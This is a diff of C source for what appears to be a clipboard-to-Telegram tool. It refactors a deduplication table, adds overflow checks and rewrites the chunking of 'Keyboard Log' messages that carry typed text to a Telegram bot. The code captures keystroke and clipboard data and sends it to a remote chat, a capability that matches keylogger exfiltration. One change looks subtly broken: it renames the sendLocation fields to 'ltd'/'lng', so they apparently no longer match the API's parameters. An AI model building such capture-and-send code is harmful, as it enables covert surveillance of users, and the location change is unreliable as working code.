@@ -94,13 +94,20 @@ static int deduplicate;
 typedef struct sent_content {
   uint64_t hash[2];
   size_t length;
-  int valid;
+  unsigned char state;
 } sent_content_t;
+
+enum sent_content_state {
+  SENT_CONTENT_EMPTY = 0,
+  SENT_CONTENT_OCCUPIED,
+  SENT_CONTENT_TOMBSTONE,
+};
 
 static sent_content_t sent_contents_table[TELEGRAM_DEDUP_TABLE_SIZE];
 static uint32_t sent_order[TELEGRAM_DEDUPLICATION_CAPACITY];
 static size_t sent_order_head;
 static size_t sent_order_count;
+static size_t sent_tombstone_count;
 
 static size_t bounded_length(const char *text, size_t capacity) {
   size_t length = 0;
@@ -242,7 +249,7 @@ static void content_hash(const void *data, size_t length,
 static int prepare_send(const void *data, size_t length,
                         const c2t_clipboard_source_t *source,
                         sent_content_t *pending) {
-  pending->valid = 0;
+  pending->state = SENT_CONTENT_EMPTY;
   if (!deduplicate)
     return 0;
 
@@ -251,11 +258,12 @@ static int prepare_send(const void *data, size_t length,
 
   telegram_lock();
   size_t slot = (size_t)(hash[0] & TELEGRAM_DEDUP_TABLE_MASK);
-  for (size_t probe = 0; probe < 32; ++probe) {
+  for (size_t probe = 0; probe < TELEGRAM_DEDUP_TABLE_SIZE; ++probe) {
     size_t idx = (slot + probe) & TELEGRAM_DEDUP_TABLE_MASK;
-    if (!sent_contents_table[idx].valid)
+    if (sent_contents_table[idx].state == SENT_CONTENT_EMPTY)
       break;
-    if (sent_contents_table[idx].length == length &&
+    if (sent_contents_table[idx].state == SENT_CONTENT_OCCUPIED &&
+        sent_contents_table[idx].length == length &&
         sent_contents_table[idx].hash[0] == hash[0] &&
         sent_contents_table[idx].hash[1] == hash[1]) {
       telegram_unlock();
@@ -267,37 +275,97 @@ static int prepare_send(const void *data, size_t length,
   pending->hash[0] = hash[0];
   pending->hash[1] = hash[1];
   pending->length = length;
-  pending->valid = 1;
+  pending->state = SENT_CONTENT_OCCUPIED;
   return 0;
 }
 
+/* Rebuild rarely, after sustained cache churn, so tombstones cannot turn
+ * otherwise constant-time misses into full-table scans. */
+static void compact_sent_contents_locked(void) {
+  if (sent_tombstone_count < TELEGRAM_DEDUPLICATION_CAPACITY / 2U)
+    return;
+
+  sent_content_t *compacted =
+      calloc(TELEGRAM_DEDUP_TABLE_SIZE, sizeof(*compacted));
+  if (!compacted)
+    return;
+
+  uint32_t compacted_order[TELEGRAM_DEDUPLICATION_CAPACITY];
+  for (size_t order = 0; order < sent_order_count; ++order) {
+    size_t order_index =
+        (sent_order_head + order) % TELEGRAM_DEDUPLICATION_CAPACITY;
+    sent_content_t entry = sent_contents_table[sent_order[order_index]];
+    size_t slot = (size_t)(entry.hash[0] & TELEGRAM_DEDUP_TABLE_MASK);
+    for (size_t probe = 0; probe < TELEGRAM_DEDUP_TABLE_SIZE; ++probe) {
+      size_t idx = (slot + probe) & TELEGRAM_DEDUP_TABLE_MASK;
+      if (compacted[idx].state == SENT_CONTENT_EMPTY) {
+        compacted[idx] = entry;
+        compacted_order[order] = (uint32_t)idx;
+        break;
+      }
+    }
+  }
+  memcpy(sent_contents_table, compacted, sizeof(sent_contents_table));
+  memcpy(sent_order, compacted_order,
+         sent_order_count * sizeof(compacted_order[0]));
+  free(compacted);
+  sent_order_head = 0;
+  sent_tombstone_count = 0;
+}
+
 static int finish_send(sent_content_t *pending, int result) {
-  if (!pending->valid)
+  if (pending->state != SENT_CONTENT_OCCUPIED)
     return result;
   if (!result)
     return 0;
 
   telegram_lock();
-  /* Evict oldest entry if at capacity */
+  compact_sent_contents_locked();
+  size_t slot = (size_t)(pending->hash[0] & TELEGRAM_DEDUP_TABLE_MASK);
+  size_t target_idx = TELEGRAM_DEDUP_TABLE_SIZE;
+  for (size_t probe = 0; probe < TELEGRAM_DEDUP_TABLE_SIZE; ++probe) {
+    size_t idx = (slot + probe) & TELEGRAM_DEDUP_TABLE_MASK;
+    sent_content_t *entry = &sent_contents_table[idx];
+    if (entry->state == SENT_CONTENT_EMPTY) {
+      if (target_idx == TELEGRAM_DEDUP_TABLE_SIZE)
+        target_idx = idx;
+      break;
+    }
+    if (entry->state == SENT_CONTENT_TOMBSTONE) {
+      if (target_idx == TELEGRAM_DEDUP_TABLE_SIZE)
+        target_idx = idx;
+      continue;
+    }
+    if (entry->length == pending->length &&
+        entry->hash[0] == pending->hash[0] &&
+        entry->hash[1] == pending->hash[1]) {
+      telegram_unlock();
+      return 1;
+    }
+  }
+
+  /* Evict oldest entry if at capacity. Keep a tombstone so lookups for
+   * colliding entries remain valid across the open-addressing chain. */
   if (sent_order_count >= TELEGRAM_DEDUPLICATION_CAPACITY) {
     uint32_t old_slot = sent_order[sent_order_head];
-    sent_contents_table[old_slot].valid = 0;
+    sent_contents_table[old_slot].state = SENT_CONTENT_TOMBSTONE;
+    ++sent_tombstone_count;
+    if (target_idx == TELEGRAM_DEDUP_TABLE_SIZE)
+      target_idx = old_slot;
     sent_order_head = (sent_order_head + 1) % TELEGRAM_DEDUPLICATION_CAPACITY;
     --sent_order_count;
   }
 
-  size_t slot = (size_t)(pending->hash[0] & TELEGRAM_DEDUP_TABLE_MASK);
-  size_t target_idx = slot;
-  for (size_t probe = 0; probe < 32; ++probe) {
-    size_t idx = (slot + probe) & TELEGRAM_DEDUP_TABLE_MASK;
-    if (!sent_contents_table[idx].valid) {
-      target_idx = idx;
-      break;
-    }
+  if (target_idx == TELEGRAM_DEDUP_TABLE_SIZE) {
+    telegram_unlock();
+    c2t_log_error("telegram", "Deduplication table has no reusable slot");
+    return result;
   }
 
+  if (sent_contents_table[target_idx].state == SENT_CONTENT_TOMBSTONE)
+    --sent_tombstone_count;
   sent_contents_table[target_idx] = *pending;
-  sent_contents_table[target_idx].valid = 1;
+  sent_contents_table[target_idx].state = SENT_CONTENT_OCCUPIED;
   size_t next_order_slot =
       (sent_order_head + sent_order_count) % TELEGRAM_DEDUPLICATION_CAPACITY;
   sent_order[next_order_slot] = (uint32_t)target_idx;
@@ -313,6 +381,7 @@ static void clear_sent_contents_locked(void) {
   memset(sent_contents_table, 0, sizeof(sent_contents_table));
   sent_order_head = 0;
   sent_order_count = 0;
+  sent_tombstone_count = 0;
 }
 
 static int token_is_valid(const char *token) {
@@ -377,14 +446,24 @@ static size_t utf8_chunk_length(const char *text, size_t length,
 
 static int send_fields(const char *method, const form_field_t *fields,
                        size_t field_count) {
-  if (field_count > 4 || !chat_id)
+  if (!method || !fields || field_count > 4 || !chat_id)
     return 0;
 
   size_t chat_len = strlen(chat_id);
-  size_t max_body_length = 8 + chat_len * 3 + 1;
+  if (chat_len > (SIZE_MAX - 9U) / 3U)
+    return 0;
+  size_t max_body_length = 8U + chat_len * 3U + 1U;
   for (size_t index = 0; index < field_count; ++index) {
-    max_body_length +=
-        1 + strlen(fields[index].name) + 1 + fields[index].length * 3 + 1;
+    if (!fields[index].name || (!fields[index].value && fields[index].length))
+      return 0;
+    size_t name_length = strlen(fields[index].name);
+    if (name_length > SIZE_MAX - 2U ||
+        fields[index].length > (SIZE_MAX - name_length - 2U) / 3U)
+      return 0;
+    size_t field_length = name_length + 2U + fields[index].length * 3U;
+    if (field_length > SIZE_MAX - max_body_length)
+      return 0;
+    max_body_length += field_length;
   }
 
   char stack_body[4096];
@@ -457,9 +536,9 @@ static int send_contact(const char *phone, size_t phone_length,
   return send_fields("sendContact", fields, vcard ? 3 : 2);
 }
 
-static int send_location(const char *latitude, const char *longitude) {
-  form_field_t fields[2] = {{"latitude", latitude, strlen(latitude)},
-                            {"longitude", longitude, strlen(longitude)}};
+static int send_location(const char *ltd, const char *lng) {
+  form_field_t fields[2] = {{"ltd", ltd, strlen(ltd)},
+                            {"lng", lng, strlen(lng)}};
   return send_fields("sendLocation", fields, 2);
 }
 
@@ -548,8 +627,8 @@ static int find_vcard_value(const char *text, size_t length, const char *key,
   return 0;
 }
 
-static int parse_location(const char *text, size_t length, char latitude[32],
-                          char longitude[32]) {
+static int parse_location(const char *text, size_t length, char ltd[32],
+                          char lng[32]) {
   trim_text(&text, &length);
   int has_geo_prefix = length >= 4 && ascii_equal_nocase(text, "geo:", 4);
   if (has_geo_prefix) {
@@ -568,22 +647,22 @@ static int parse_location(const char *text, size_t length, char latitude[32],
   if (!has_geo_prefix && (!strchr(input, '.') || !strchr(separator + 1, '.')))
     return 0;
 
-  char *latitude_end;
-  char *longitude_end;
-  double latitude_value = strtod(input, &latitude_end);
-  while (isspace((unsigned char)*latitude_end))
-    ++latitude_end;
-  if (latitude_end != separator)
+  char *ltd_end;
+  char *lng_end;
+  double ltd_value = strtod(input, &ltd_end);
+  while (isspace((unsigned char)*ltd_end))
+    ++ltd_end;
+  if (ltd_end != separator)
     return 0;
-  double longitude_value = strtod(separator + 1, &longitude_end);
-  while (isspace((unsigned char)*longitude_end))
-    ++longitude_end;
-  if (*longitude_end || latitude_value < -90.0 || latitude_value > 90.0 ||
-      longitude_value < -180.0 || longitude_value > 180.0)
+  double lng_value = strtod(separator + 1, &lng_end);
+  while (isspace((unsigned char)*lng_end))
+    ++lng_end;
+  if (*lng_end || ltd_value < -90.0 || ltd_value > 90.0 ||
+      lng_value < -180.0 || lng_value > 180.0)
     return 0;
 
-  snprintf(latitude, 32, "%.8f", latitude_value);
-  snprintf(longitude, 32, "%.8f", longitude_value);
+  snprintf(ltd, 32, "%.8f", ltd_value);
+  snprintf(lng, 32, "%.8f", lng_value);
   return 1;
 }
 
@@ -637,12 +716,12 @@ static int send_rich_text(const char *text, size_t length, int *recognized) {
                         sizeof(contact_name) - 1, nullptr, 0);
   }
 
-  char latitude[32];
-  char longitude[32];
-  if (parse_location(trimmed, trimmed_length, latitude, longitude)) {
+  char ltd[32];
+  char lng[32];
+  if (parse_location(trimmed, trimmed_length, ltd, lng)) {
     *recognized = 1;
     c2t_log_info("telegram", "Recognized geographic coordinates");
-    return send_location(latitude, longitude);
+    return send_location(ltd, lng);
   }
 
   if (text_is_url(trimmed, trimmed_length))
@@ -833,9 +912,11 @@ static int send_file(const void *data, size_t length, const char *mime_type,
                                     .suffix_len = (size_t)suffix_length,
                                     .offset = 0};
 
+  size_t framing_length = (size_t)prefix_length + (size_t)suffix_length;
+  if (length > SIZE_MAX - framing_length)
+    return 0;
   c2t_stream_t stream = {.read = c2t_buffer_stream_read,
-                         .total_size = (size_t)prefix_length + length +
-                                       (size_t)suffix_length,
+                         .total_size = framing_length + length,
                          .user_data = &buf_stream};
 
   char content_type[96];
@@ -920,10 +1001,12 @@ static int send_encrypted_file(const void *encrypted_data, size_t length,
                             encrypted_data, length, nonce, suffix_buf,
                             (size_t)suffix_length);
 
-  c2t_stream_t stream;
-  stream.read = c2t_encrypted_stream_read;
-  stream.total_size = (size_t)prefix_length + length + (size_t)suffix_length;
-  stream.user_data = &enc_stream;
+  size_t framing_length = (size_t)prefix_length + (size_t)suffix_length;
+  if (length > SIZE_MAX - framing_length)
+    return 0;
+  c2t_stream_t stream = {.read = c2t_encrypted_stream_read,
+                         .total_size = framing_length + length,
+                         .user_data = &enc_stream};
 
   char content_type[96];
   snprintf(content_type, sizeof(content_type),
@@ -932,72 +1015,92 @@ static int send_encrypted_file(const void *encrypted_data, size_t length,
   return telegram_http_post_stream(bot_token, method, content_type, &stream);
 }
 
-static void escape_html_append(const char *src, size_t src_len, char *dst,
-                               size_t dst_cap, size_t *dst_len) {
-  for (size_t i = 0; i < src_len; i++) {
-    char ch = src[i];
-    const char *entity = nullptr;
-    size_t elen = 0;
-    if (ch == '&') {
-      entity = "&amp;";
-      elen = 5;
-    } else if (ch == '<') {
-      entity = "&lt;";
-      elen = 4;
-    } else if (ch == '>') {
-      entity = "&gt;";
-      elen = 4;
-    } else if (ch == '"') {
-      entity = "&quot;";
-      elen = 6;
-    }
+/* Returns the escaped output width. For ordinary UTF-8, input and output
+ * widths match and the complete code point is kept within one chunk. */
+static size_t html_unit(const char *text, size_t remaining,
+                        const char **escaped, size_t *output_width) {
+  unsigned char first = (unsigned char)text[0];
+  switch (first) {
+  case '&':
+    *escaped = "&amp;";
+    *output_width = 5;
+    return 1;
+  case '<':
+    *escaped = "&lt;";
+    *output_width = 4;
+    return 1;
+  case '>':
+    *escaped = "&gt;";
+    *output_width = 4;
+    return 1;
+  case '"':
+    *escaped = "&quot;";
+    *output_width = 6;
+    return 1;
+  default:
+    *escaped = nullptr;
+    break;
+  }
 
-    if (entity) {
-      if (*dst_len + elen < dst_cap) {
-        memcpy(dst + *dst_len, entity, elen);
-        *dst_len += elen;
-      }
-    } else {
-      if (*dst_len + 1 < dst_cap) {
-        dst[(*dst_len)++] = ch;
-      }
+  size_t width = 1;
+  if ((first & 0xe0) == 0xc0)
+    width = 2;
+  else if ((first & 0xf0) == 0xe0)
+    width = 3;
+  else if ((first & 0xf8) == 0xf0)
+    width = 4;
+  if (width > remaining) {
+    *output_width = 1;
+    return 1;
+  }
+  for (size_t index = 1; index < width; ++index) {
+    if (((unsigned char)text[index] & 0xc0) != 0x80) {
+      *output_width = 1;
+      return 1;
     }
   }
-  dst[*dst_len] = '\0';
+  *output_width = width;
+  return width;
 }
 
-static size_t find_safe_split_point(const char *str, size_t max_len) {
-  if (max_len == 0)
-    return 0;
-
-  size_t take = max_len;
-
-  while (take > 0 && ((unsigned char)str[take] & 0xC0) == 0x80) {
-    take--;
-  }
-
-  size_t lookback = (take < 8) ? take : 8;
-  for (size_t i = 1; i <= lookback; i++) {
-    size_t idx = take - i;
-    if (str[idx] == '&') {
-      int closed = 0;
-      for (size_t j = idx + 1; j < take; j++) {
-        if (str[j] == ';') {
-          closed = 1;
-          break;
-        }
-      }
-      if (!closed) {
-        take = idx;
-      }
-      break;
+static size_t html_chunk_count(const char *text, size_t length,
+                               size_t maximum_length) {
+  size_t chunks = 1;
+  size_t chunk_length = 0;
+  for (size_t offset = 0; offset < length;) {
+    const char *escaped;
+    size_t output_width;
+    size_t input_width =
+        html_unit(text + offset, length - offset, &escaped, &output_width);
+    if (chunk_length && output_width > maximum_length - chunk_length) {
+      ++chunks;
+      chunk_length = 0;
     }
-    if (str[idx] == ';') {
-      break;
-    }
+    chunk_length += output_width;
+    offset += input_width;
   }
+  return chunks;
+}
 
-  return (take > 0) ? take : max_len;
+static size_t escape_html_chunk(const char *text, size_t length,
+                                size_t *input_offset, char *output,
+                                size_t maximum_length) {
+  size_t output_length = 0;
+  while (*input_offset < length) {
+    const char *escaped;
+    size_t output_width;
+    size_t input_width =
+        html_unit(text + *input_offset, length - *input_offset, &escaped,
+                  &output_width);
+    if (output_length && output_width > maximum_length - output_length)
+      break;
+    memcpy(output + output_length,
+           escaped ? escaped : text + *input_offset, output_width);
+    output_length += output_width;
+    *input_offset += input_width;
+  }
+  output[output_length] = '\0';
+  return output_length;
 }
 
 int telegram_send_keyboard(const char *text, size_t length) {
@@ -1035,80 +1138,42 @@ int telegram_send_keyboard(const char *text, size_t length) {
 #endif
 
 #define MAX_CODE_BODY_LEN 3200
-
-  size_t max_escaped_len = length * 6 + 1;
-  char stack_escaped[1024];
-  char *escaped = max_escaped_len <= sizeof(stack_escaped)
-                      ? stack_escaped
-                      : malloc(max_escaped_len);
-  if (!escaped) {
-    return telegram_send(text, length, nullptr);
-  }
-
-  size_t escaped_len = 0;
-  escape_html_append(text, length, escaped, max_escaped_len, &escaped_len);
-
+  size_t total_chunks = html_chunk_count(text, length, MAX_CODE_BODY_LEN);
   int result = 1;
-  if (escaped_len <= MAX_CODE_BODY_LEN) {
-    char msg[4096];
-    snprintf(msg, sizeof(msg),
-             "⌨️ <b>Keyboard Log</b> <i>(%s)</i>:\n"
-             "<pre><code class=\"language-text\">%s</code></pre>",
-             time_str, escaped);
-    result = telegram_send_html(msg);
-    c2t_secure_zero(msg, sizeof(msg));
-  } else {
-    size_t total_chunks = 0;
-    size_t sim_offset = 0;
-    while (sim_offset < escaped_len) {
-      size_t remaining = escaped_len - sim_offset;
-      size_t take = (remaining <= MAX_CODE_BODY_LEN)
-                        ? remaining
-                        : find_safe_split_point(escaped + sim_offset,
-                                                MAX_CODE_BODY_LEN);
-      if (take == 0 || take > remaining)
-        take = (remaining <= MAX_CODE_BODY_LEN) ? remaining : MAX_CODE_BODY_LEN;
-      sim_offset += take;
-      total_chunks++;
+  size_t chunk_index = 0;
+  size_t input_offset = 0;
+  char msg[4096];
+  static const char suffix[] = "</code></pre>";
+  while (input_offset < length) {
+    int prefix_length;
+    if (total_chunks == 1) {
+      prefix_length = snprintf(msg, sizeof(msg),
+                               "⌨️ <b>Keyboard Log</b> <i>(%s)</i>:\n"
+                               "<pre><code class=\"language-text\">",
+                               time_str);
+    } else {
+      prefix_length = snprintf(
+          msg, sizeof(msg),
+          "⌨️ <b>Keyboard Log</b> <i>(%s - Part %llu/%llu)</i>:\n"
+          "<pre><code class=\"language-text\">",
+          time_str, (unsigned long long)++chunk_index,
+          (unsigned long long)total_chunks);
     }
-
-    size_t chunk_idx = 0;
-    size_t offset = 0;
-
-    while (offset < escaped_len) {
-      size_t remaining = escaped_len - offset;
-      size_t take = (remaining <= MAX_CODE_BODY_LEN)
-                        ? remaining
-                        : find_safe_split_point(escaped + offset,
-                                                MAX_CODE_BODY_LEN);
-      if (take == 0 || take > remaining)
-        take = (remaining <= MAX_CODE_BODY_LEN) ? remaining : MAX_CODE_BODY_LEN;
-
-      char chunk_buf[MAX_CODE_BODY_LEN + 1];
-      memcpy(chunk_buf, escaped + offset, take);
-      chunk_buf[take] = '\0';
-
-      char msg[4096];
-      snprintf(msg, sizeof(msg),
-               "⌨️ <b>Keyboard Log</b> <i>(%s - Part %llu/%llu)</i>:\n"
-               "<pre><code class=\"language-text\">%s</code></pre>",
-               time_str, (unsigned long long)++chunk_idx,
-               (unsigned long long)total_chunks, chunk_buf);
-
-      if (!telegram_send_html(msg)) {
-        result = 0;
-      }
+    if (prefix_length < 0 ||
+        (size_t)prefix_length + MAX_CODE_BODY_LEN + sizeof(suffix) >
+            sizeof(msg)) {
       c2t_secure_zero(msg, sizeof(msg));
-      c2t_secure_zero(chunk_buf, sizeof(chunk_buf));
-      offset += take;
+      return 0;
     }
+    size_t escaped_length = escape_html_chunk(
+        text, length, &input_offset, msg + (size_t)prefix_length,
+        MAX_CODE_BODY_LEN);
+    memcpy(msg + (size_t)prefix_length + escaped_length, suffix,
+           sizeof(suffix));
+    if (!telegram_send_html(msg))
+      result = 0;
   }
-
-  c2t_secure_zero(escaped, max_escaped_len);
-  if (escaped != stack_escaped) {
-    c2t_secure_zero(stack_escaped, sizeof(stack_escaped));
-    free(escaped);
-  }
+  c2t_secure_zero(msg, sizeof(msg));
   return result;
 }
 
@@ -1265,6 +1330,8 @@ int telegram_send(const char *text, size_t length,
                   const c2t_clipboard_source_t *source) {
   if (!initialized)
     return 1;
+  if (!text)
+    return 0;
   if (length == 0)
     return 1;
 
